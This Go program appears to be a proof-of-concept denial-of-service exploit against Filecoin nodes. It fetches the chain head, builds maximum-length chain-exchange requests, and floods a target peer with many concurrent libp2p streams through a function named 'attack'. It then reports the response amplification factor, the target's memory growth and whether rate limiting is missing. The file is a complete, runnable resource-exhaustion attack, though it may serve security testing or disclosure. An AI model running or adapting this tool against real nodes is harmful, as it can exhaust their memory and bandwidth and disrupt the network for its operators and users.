package main

import (
	"bytes"
	"context"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/ipfs/go-cid"
	"github.com/libp2p/go-libp2p"
	"github.com/libp2p/go-libp2p/core/crypto"
	"github.com/libp2p/go-libp2p/core/host"
	"github.com/libp2p/go-libp2p/core/peer"
	"github.com/libp2p/go-libp2p/core/peerstore"
	"github.com/multiformats/go-multiaddr"
)

const proto = "/fil/chain/xchg/0.0.1"

// cbor encode Request{Head, Length, Options}
func encodeReq(heads []cid.Cid, length, opts uint64) []byte {
	var b bytes.Buffer
	b.WriteByte(0x83)
	b.WriteByte(0x80 | byte(len(heads)))
	for _, c := range heads {
		b.Write([]byte{0xd8, 0x2a})
		cb := append([]byte{0x00}, c.Bytes()...)
		if len(cb) < 24 {
			b.WriteByte(0x40 | byte(len(cb)))
		} else {
			b.WriteByte(0x58)
			b.WriteByte(byte(len(cb)))
		}
		b.Write(cb)
	}
	writeUint(&b, length)
	writeUint(&b, opts)
	return b.Bytes()
}

func writeUint(w *bytes.Buffer, v uint64) {
	switch {
	case v < 24:
		w.WriteByte(byte(v))
	case v < 256:
		w.Write([]byte{0x18, byte(v)})
	case v < 65536:
		w.WriteByte(0x19)
		binary.Write(w, binary.BigEndian, uint16(v))
	default:
		w.WriteByte(0x1b)
		binary.Write(w, binary.BigEndian, v)
	}
}

func getHead(api string) ([]cid.Cid, error) {
	resp, err := http.Post(api, "application/json",
		strings.NewReader(`{"jsonrpc":"2.0","method":"Filecoin.ChainHead","params":[],"id":1}`))
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	data, _ := io.ReadAll(resp.Body)
	var r struct{ Result struct{ Cids []cid.Cid } }
	json.Unmarshal(data, &r)
	return r.Result.Cids, nil
}

func getRSS(pid int) int64 {
	if pid <= 0 {
		return 0
	}
	data, _ := os.ReadFile(fmt.Sprintf("/proc/%d/status", pid))
	for _, line := range strings.Split(string(data), "\n") {
		if strings.HasPrefix(line, "VmRSS:") {
			v, _ := strconv.ParseInt(strings.Fields(line)[1], 10, 64)
			return v
		}
	}
	return 0
}

type result struct {
	ok   bool
	size int
}

func attack(ctx context.Context, h host.Host, t peer.ID, req []byte, out chan<- result) {
	r := result{}
	s, err := h.NewStream(ctx, t, proto)
	if err != nil {
		out <- r
		return
	}
	defer s.Close()

	s.Write(req)
	s.CloseWrite()
	s.SetReadDeadline(time.Now().Add(120 * time.Second))
	data, _ := io.ReadAll(s)
	r.ok = true
	r.size = len(data)
	out <- r
}

func main() {
	if len(os.Args) < 5 {
		fmt.Fprintf(os.Stderr, "usage: %s <api> <multiaddr> <peerid> <streams> [pid]\n", os.Args[0])
		os.Exit(1)
	}

	api, addr, peerStr := os.Args[1], os.Args[2], os.Args[3]
	n, _ := strconv.Atoi(os.Args[4])
	pid := 0
	if len(os.Args) > 5 {
		pid, _ = strconv.Atoi(os.Args[5])
	}

	heads, err := getHead(api)
	if err != nil {
		fmt.Fprintf(os.Stderr, "getHead: %v\n", err)
		os.Exit(1)
	}

	// Length=900 (MaxRequestLength), Options=3 (Headers|Messages)
	req := encodeReq(heads, 900, 3)

	priv, _, _ := crypto.GenerateKeyPair(crypto.Ed25519, -1)
	h, _ := libp2p.New(libp2p.Identity(priv))
	defer h.Close()

	ma, _ := multiaddr.NewMultiaddr(addr)
	target, _ := peer.Decode(peerStr)
	h.Peerstore().AddAddr(target, ma, peerstore.PermanentAddrTTL)

	ctx := context.Background()
	if err := h.Connect(ctx, peer.AddrInfo{ID: target, Addrs: []multiaddr.Multiaddr{ma}}); err != nil {
		fmt.Fprintf(os.Stderr, "connect: %v\n", err)
		os.Exit(1)
	}

	baseRSS := getRSS(pid)
	results := make(chan result, n)
	var wg sync.WaitGroup

	t0 := time.Now()
	for i := 0; i < n; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			attack(ctx, h, target, req, results)
		}()
	}
	go func() { wg.Wait(); close(results) }()

	var ok, total int
	var peakRSS int64
	for r := range results {
		if rss := getRSS(pid); rss > peakRSS {
			peakRSS = rss
		}
		if r.ok {
			ok++
			total += r.size
		}
	}

	fmt.Printf("streams: %d/%d\n", ok, n)
	fmt.Printf("response: %d bytes total, %d avg\n", total, total/max(ok, 1))
	fmt.Printf("amplification: %.0fx\n", float64(total)/float64(len(req)*max(ok, 1)))
	fmt.Printf("time: %.2fs\n", time.Since(t0).Seconds())
	if pid > 0 && baseRSS > 0 {
		fmt.Printf("rss: %dM -> %dM (peak %dM)\n", baseRSS/1024, getRSS(pid)/1024, peakRSS/1024)
	}
	if ok == n {
		fmt.Println("no rate limiting")
	}
}

func max(a, b int) int {
	if a > b {
		return a
	}
	return b
}
